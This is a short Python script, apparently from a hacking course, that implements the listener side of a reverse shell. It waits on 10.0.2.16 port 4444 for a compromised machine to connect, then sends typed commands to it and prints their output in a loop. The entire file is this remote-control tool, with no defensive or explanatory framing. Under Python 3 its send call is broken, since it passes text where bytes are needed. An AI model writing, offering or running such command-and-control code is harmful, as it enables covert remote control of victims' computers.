#!/usr/bin/env python
import socket
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        listener.bind((ip,port)) 
        listener.listen(0) 
        print("[+] waiting for incoming connection")
        self.connection, address=listener.accept() #to make connection acceptable to anywhere in code use self
        print("[+] got connection from " + str(address))
    def execute_remotly(self,command):
        self.connection.send(command) 
        return self.connection.recv(1024) 

    def run(self):
        while True:
            command = input(">>")
            result=self.execute_remotly(command)
            print(result)
listener_obj=Listener("10.0.2.16",4444)
listener_obj.run()            

 